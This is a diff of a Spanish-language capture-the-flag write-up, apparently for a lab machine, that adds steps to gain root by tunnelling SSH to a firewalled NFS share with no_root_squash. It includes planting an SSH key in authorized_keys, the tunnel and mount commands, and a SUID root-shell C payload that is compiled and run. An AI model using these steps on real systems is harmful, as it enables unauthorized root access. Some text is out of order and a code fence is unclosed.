@@ -44,9 +44,42 @@ como un nfs, es decir es un archivo compartido y como tiene activado el "root-no
 obtener un root. El problema es que desde dentro de la maquina no puedo acceder al directorio /home/james. 
 
 # ssh tunneling
-Puedo intentar hacer un ssh tunneling con la cual acceder al directorio /home/james ya que se que es un archivo compartido nfs y que utiliza el puerto 111 aunque este puerto esta bloqueado por un firewall. Para este necesito:
+Puedo intentar hacer un ssh tunneling con la cual acceder al directorio /home/james ya que se que es un archivo compartido nfs y que utiliza el puerto 2049 aunque este puerto esta bloqueado por un firewall. Para este necesito:
 1. Establecer una conexion ssh: Esto puedo hacerlo a traves del usuario paradox, creando una private-key y una public.key y traspasando la public key al directorio /home/paradox/.ssh/authorized_keys. Para ello en la maquina atacante:
 - $ ssh-keygen -f paradox
 2. copiamos echo "<content of public key>" >> /home/paradox/.ssh/authorized_keys
+  
+Ahora podemos abrir un ssh tunel con 
+> $ ssh -i paradox -L 2049:127.0.0.1:2049 paradox@<ip_victim>
+
+Ahora ya podemos montar la el archivo compartido nfs:
+
+> $ mount -t nfs localhost:/ /tmp/mnt
+
+y podemos acceder a los archivos compartidos con
+
+ > $ cd /tmp/mnt
+ 
+ Aqui preparamos nuestro payload e C:
+ ```
+ int main(){
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+ }
+ 
+ lo compilamos con 
+ > $ gcc payload.c -o payload
+ y cambiamos a suid
+ > $ chmod +s payload
+ 
+ Nos logeamos como James con:
+ > $ ssh -i id_rsa james@<ip_victim>
+ y ejecutamos el exploit
+ > $ ./payload
+ y tenemos el root
+
+ donde se haya el user.flag. Este directorio resulta ser el /home/james y contiene el .ssh con id_rsa e id_rsa.pub. Nos copiamos el id_rsa y podemos autentificarnos
   
 
